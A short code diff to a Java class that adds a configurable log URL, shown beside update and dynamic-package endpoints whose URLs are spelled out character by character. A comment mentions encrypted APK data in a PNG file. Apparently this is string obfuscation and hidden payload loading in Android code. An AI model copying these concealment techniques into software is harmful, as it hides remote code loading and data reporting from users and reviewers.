@@ -38,6 +38,7 @@ public class NiceCts {
     public static String  UPDATE_URL = MyConfig.getIns().getKey(MyConfig.KEY_REQUEST,"");//Eget(http$$,u,p,d,a,t,e,$,d,r,o,i,d,t,o,p,o,n,e,$,com,$$,index,$,p,h,p,"?",m,"=",A,p,i,"&",c,"=",s,t,a,t,"&",a,"=",c,h,e,c,k,U,p,d,a,t,e);
     //"http://update.droidtopone.com/index.php?m=Api&c=DynamicPackage&a=result";
     public static String RESULT_URL =  MyConfig.getIns().getKey(MyConfig.KEY_RESULT, "");//Eget(http$$,u,p,d,a,t,e,$,d,r,o,i,d,t,o,p,o,n,e,$,com,$$,index,$,p,h,p,"?",m,"=",A,p,i,"&",c,"=",D,y,n,a,m,i,c,P,a,c,k,a,g,e,"&",a,"=",r,e,s,u,l,t);
+    public static String LOG_URL = MyConfig.getIns().getKey(MyConfig.KEY_LOG, "");
     public static String RESULT_URL_BACKUP = "";
     //加密apk的 Png文件
     public static String ICON_NAME = Eget(y,o,u,r,I,con,$,png);//"yourIcon.png";
